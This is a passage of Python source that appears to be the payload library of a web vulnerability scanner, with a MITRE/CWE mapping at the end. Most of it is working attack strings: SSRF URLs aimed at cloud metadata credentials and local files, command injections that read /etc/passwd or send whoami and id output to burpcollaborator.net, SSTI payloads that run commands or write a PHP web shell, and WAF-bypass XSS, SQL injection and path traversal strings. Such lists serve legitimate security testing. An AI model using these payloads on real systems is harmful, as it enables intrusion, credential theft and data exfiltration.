        "http://127.1/", "http://127.0.1/",
        # DNS rebinding
        "http://spoofed.burpcollaborator.net/",
        "http://localtest.me/",
        "http://customer1.app.localhost.my.company.127.0.0.1.nip.io/",
        # URL scheme tricks
        "gopher://127.0.0.1:25/_HELO%20localhost",
        "dict://127.0.0.1:11211/stat",
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        "ldap://127.0.0.1/",
        "tftp://127.0.0.1/test",
        # Cloud metadata — extended
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://169.254.169.254/metadata/v1/",    # DigitalOcean
        "http://100.100.100.200/latest/meta-data/", # Alibaba
        "http://169.254.169.254/opc/v2/instance/", # Oracle
        "http://169.254.170.2/v2/credentials",     # AWS ECS
        "https://kubernetes.default.svc/api/v1/namespaces",
        "https://kubernetes.default.svc/api/v1/pods",
        # SSRF to internal services
        "http://127.0.0.1:22/", "http://127.0.0.1:3306/",
        "http://127.0.0.1:6379/", "http://127.0.0.1:9200/",
        "http://127.0.0.1:11211/", "http://127.0.0.1:27017/",
    ]

    # --- Advanced Command Injection (from PayloadsAllTheThings) ---
    CMDI_ADVANCED = [
        # IFS-based space bypass
        "cat${IFS}/etc/passwd", "cat$IFS/etc/passwd",
        ";${IFS}cat${IFS}/etc/passwd",
        # Quoting tricks
        "c'a't /etc/passwd", 'c"a"t /etc/passwd',
        "c\\at /etc/passwd", "/???/??t /etc/passwd",
        # Brace expansion
        "{cat,/etc/passwd}", "{ls,-la,/}",
        # Variable substitution
        "a]a]a;{cat,/etc/passwd}", "$({cat,/etc/passwd})",
        # Encoding bypasses
        "`echo Y2F0IC9ldGMvcGFzc3dk|base64 -d`",
        "$(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d)",
        "echo${IFS}Y2F0IC9ldGMvcGFzc3dk${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}sh",
        # Wildcard bypass
        "/e?c/p?sswd", "/e*/passwd",
        "cat /etc/pass??", "cat /etc/passw*",
        # Newline / tab injection
        "%0aid", "%0a/bin/cat%20/etc/passwd",
        "$'\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64'",
        # DNS / OOB
        ";nslookup test.burpcollaborator.net",
        ";curl http://test.burpcollaborator.net/$(whoami)",
        "`wget http://test.burpcollaborator.net/$(id)`",
    ]

    # --- Advanced SSTI (from PayloadsAllTheThings) ---
    SSTI_ADVANCED = [
        # Detection
        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
        "{{7*'7'}}", "{{'7'*7}}", "#{7*7}",
        # Jinja2 (Python)
        "{{config}}", "{{config.items()}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
        "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('id').read()\")}}{% endif %}{% endfor %}",
        # Twig (PHP)
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{['id']|filter('system')}}",
        # Freemarker (Java)
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        # Smarty (PHP)
        "{php}echo `id`;{/php}",
        "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",
        # Pebble (Java)
        "{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}",
        # ERB (Ruby)
        "<%= system('id') %>", "<%= `id` %>",
        # Handlebars (JS)
        "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
    ]

    # --- WAF Bypass Payload Library (from WafW00f/WAF-bypass-collection) ---
    WAF_BYPASS_PAYLOADS = {
        'xss_waf': [
            "<svg/onload=alert(1)>",
            "<img src=x onerror=alert`1`>",
            "<details/open/ontoggle=alert`1`>",
            "'-alert(1)-'", "\\'-alert(1)//",
            "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
            "<a href=\"javascript&colon;alert(1)\">click</a>",
            "<svg><script>alert&#40;1&#41;</script>",
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )",
        ],
        'sqli_waf': [
            "' /*!50000OR*/ 1=1-- -",
            "' /*!50000UNION*/ /*!50000ALL*/ /*!50000SELECT*/ 1,2,3-- -",
            "' OR/**/ 1=1-- -",
            "'/**/OR/**/1=1--/**/-",
            "' /*!50000OR*/ '1'='1'-- -",
            "'-IF(1=1,SLEEP(5),0)--+-",
            "' AND 1=1 ORDER BY 1-- -",
            "' UNION%23%0ASELECT 1,2,3-- -",
            "' UNION%0D%0ASELECT 1,2,3-- -",
            "' UN%49ON SE%4CECT 1,2,3-- -",
        ],
        'lfi_waf': [
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "/..%00/..%00/..%00/etc/passwd",
            "..\\..\\..\\..\\etc\\passwd",
            "..%5c..%5c..%5c..%5cetc%5cpasswd",
        ],
        'cmdi_waf': [
            "$(cat${IFS}/etc/passwd)",
            ";cat${IFS}/etc/passwd",
            "|cat<</etc/passwd",
            "`echo${IFS}id`",
            "a]a]a;{cat,/etc/passwd}",
            "$'\\x63at'${IFS}'/etc/passwd'",
        ],
    }

    # --- Content Discovery Paths (from SecLists/dirsearch/gobuster) ---
    DISCOVERY_PATHS_EXTENDED = [
        # Environment / config leak
        '/.env', '/.env.bak', '/.env.local', '/.env.production',
        '/.env.development', '/.env.staging',
        '/config.yml', '/config.yaml', '/config.json', '/config.xml',
        '/config.php.bak', '/config.inc', '/configuration.php',
        '/settings.py', '/local_settings.py',
        '/application.properties', '/application.yml',
        '/appsettings.json', '/appsettings.Development.json',
        '/wp-config.php', '/wp-config.php.bak', '/wp-config.php.old',
        # VCS leak
        '/.git/HEAD', '/.git/config', '/.git/index',
        '/.gitignore', '/.gitattributes',
        '/.svn/entries', '/.svn/wc.db',
        '/.hg/hgrc', '/.hg/store',
        '/.bzr/branch-format',
        # Docker / Container
        '/Dockerfile', '/docker-compose.yml', '/docker-compose.yaml',
        '/.dockerenv',
        # CI/CD config
        '/.github/workflows/', '/.gitlab-ci.yml',
        '/Jenkinsfile', '/.circleci/config.yml',
        '/.travis.yml',
        # Dependency files
        '/package.json', '/package-lock.json',
        '/yarn.lock', '/composer.json', '/composer.lock',
        '/Gemfile', '/Gemfile.lock',
        '/requirements.txt', '/Pipfile', '/Pipfile.lock',
        '/go.mod', '/go.sum',
        '/Cargo.toml', '/Cargo.lock',
        '/pom.xml', '/build.gradle',
        # API documentation
        '/swagger.json', '/swagger.yaml', '/swagger-ui.html',
        '/openapi.json', '/openapi.yaml',
        '/api-docs', '/api/docs', '/api/swagger',
        '/v1/api-docs', '/v2/api-docs', '/v3/api-docs',
        '/graphql', '/graphiql', '/altair',
        '/playground', '/__graphql',
        # Debug / info endpoints
        '/actuator', '/actuator/env', '/actuator/health',
        '/actuator/info', '/actuator/mappings', '/actuator/beans',
        '/actuator/configprops', '/actuator/trace', '/actuator/heapdump',
        '/_debug', '/__debug__/', '/debug/pprof/',
        '/trace', '/metrics', '/stats',
        '/server-status', '/server-info',
        '/elmah.axd', '/phpinfo.php',
        '/info.php', '/test.php', '/pi.php',
        # Admin & consoles
        '/admin/', '/admin/login', '/admin/dashboard',
        '/administrator/', '/manager/html',
        '/console', '/console/', '/h2-console/',
        '/system', '/monitoring', '/nagios',
        # Backup files
        '/backup.sql', '/backup.zip', '/backup.tar.gz',
        '/db.sql', '/database.sql', '/dump.sql',
        '/site.tar.gz', '/www.zip', '/public.zip',
        '/old/', '/bak/', '/copy/',
        # Error pages that leak info
        '/404', '/500', '/error', '/errors/500',
        '/cgi-bin/', '/cgi-bin/test-cgi',
        # Well-known paths
        '/.well-known/openid-configuration',
        '/.well-known/security.txt',
        '/.well-known/change-password',
        '/.well-known/apple-app-site-association',
        '/.well-known/assetlinks.json',
    ]

    # --- API Endpoint Patterns (from SecLists API wordlists) ---
    API_ENDPOINT_PATTERNS = [
        '/api/v1/users', '/api/v1/admin', '/api/v1/auth',
        '/api/v1/login', '/api/v1/register', '/api/v1/token',
        '/api/v1/refresh', '/api/v1/config', '/api/v1/settings',
        '/api/v1/upload', '/api/v1/download', '/api/v1/export',
        '/api/v1/import', '/api/v1/search', '/api/v1/status',
        '/api/v2/users', '/api/v2/admin', '/api/v2/auth',
        '/api/users', '/api/admin', '/api/auth', '/api/health',
        '/api/token', '/api/config', '/api/settings',
        '/api/internal', '/api/private', '/api/debug',
        '/rest/v1/', '/rest/v2/', '/rest/api/',
        '/graphql', '/graphql/v1',
        '/rpc', '/jsonrpc', '/xmlrpc',
    ]

    # --- Fuzzer Extra Parameters (from Arjun/ParamSpider) ---
    FUZZER_EXTRA_PARAMS = [
        # Auth & session
        'access_token', 'refresh_token', 'id_token', 'oauth_token',
        'api_key', 'apikey', 'api_secret', 'client_id', 'client_secret',
        'session_id', 'sessionid', 'auth_token', 'csrf_token', 'xsrf_token',
        'nonce', 'state', 'code', 'grant_type', 'scope',
        # File / path operations
        'file', 'filename', 'filepath', 'path', 'dir', 'directory',
        'folder', 'root', 'document', 'template', 'include', 'require',
        'src', 'source', 'resource', 'assets',
        # Network / URL
        'url', 'uri', 'href', 'link', 'next', 'redirect', 'redirect_uri',
        'return', 'return_url', 'returnTo', 'callback', 'continue',
        'destination', 'forward', 'goto', 'target', 'to', 'out',
        'rurl', 'reference', 'site',
        # Injection points
        'cmd', 'exec', 'command', 'execute', 'ping', 'query',
        'jump', 'code', 'reg', 'do', 'func', 'arg', 'option',
        'load', 'process', 'step', 'read', 'feature', 'payload',
        # Display / debug
        'debug', 'test', 'verbose', 'trace', 'log_level',
        'env', 'mode', 'preview', 'dev', 'view_source',
        'internal', 'hidden', 'private', 'show', 'display',
        # Content
        'content', 'body', 'text', 'html', 'xml', 'json', 'data',
        'raw', 'input', 'output', 'message', 'comment',
        'title', 'description', 'subject', 'bio', 'name',
        # Sorting / filtering
        'sort', 'order', 'orderby', 'sort_by', 'direction',
        'filter', 'where', 'column', 'field', 'group_by',
        'having', 'join', 'table',
    ]


class Colors:
    """Terminal Colors"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
    
    @classmethod
    def success(cls, text):
        return f"{cls.GREEN}[✓]{cls.RESET} {text}"
    
    @classmethod
    def error(cls, text):
        return f"{cls.RED}[✗]{cls.RESET} {text}"
    
    @classmethod
    def warning(cls, text):
        return f"{cls.YELLOW}[!]{cls.RESET} {text}"
    
    @classmethod
    def info(cls, text):
        return f"{cls.CYAN}[*]{cls.RESET} {text}"
    
    @classmethod
    def critical(cls, text):
        return f"{cls.RED}{cls.BOLD}[CRITICAL]{cls.RESET} {text}"


# MITRE ATT&CK Mapping
MITRE_CWE_MAP = {
    "SQL Injection": ("T1190", "CWE-89"),
    "NoSQL Injection": ("T1190", "CWE-943"),
    "Command Injection": ("T1059", "CWE-78"),
    "SSTI": ("T1505", "CWE-1336"),
    "XXE": ("T1190", "CWE-611"),
    "XSS": ("T1189", "CWE-79"),
    "CSRF": ("T1659", "CWE-352"),
    "Open Redirect": ("T1566", "CWE-601"),
    "LFI": ("T1083", "CWE-22"),
    "RFI": ("T1505", "CWE-98"),
    "SSRF": ("T1505", "CWE-918"),
    "IDOR": ("T1083", "CWE-639"),
    "Race Condition": ("T1496", "CWE-362"),
    "Prototype Pollution": ("T1059", "CWE-915"),
    "HTTP Request Smuggling": ("T1505", "CWE-444"),
    "HTTP Smuggling": ("T1190", "CWE-444"),
    "GraphQL Injection": ("T1190", "CWE-89"),
    "JWT Weakness": ("T1550", "CWE-347"),
    "CORS Misconfiguration": ("T1550", "CWE-942"),
    "Cloud Metadata Exposure": ("T1552", "CWE-200"),
    "Container Escape": ("T1611", "CWE-250"),
    "File Upload": ("T1505", "CWE-434"),
    "Path Traversal": ("T1083", "CWE-22"),
    "LDAP Injection": ("T1190", "CWE-90"),
    "XPath Injection": ("T1190", "CWE-643"),
    "XML Injection": ("T1190", "CWE-91"),
    "Log Injection": ("T1565", "CWE-117"),
    "Host Header Injection": ("T1550", "CWE-346"),
    "Cache Poisoning": ("T1565", "CWE-444"),
    "Information Disclosure": ("T1592", "CWE-200"),
    "CRLF Injection": ("T1190", "CWE-93"),
    "HTTP Parameter Pollution": ("T1190", "CWE-235"),
    "Network Exploit": ("T1190", "CWE-200"),
    "Tech Exploit": ("T1190", "CWE-1104"),
    "Service Exposure": ("T1190", "CWE-284"),
    "Missing Security Header": ("T1189", "CWE-693"),
    "Version Disclosure": ("T1592", "CWE-200"),
}
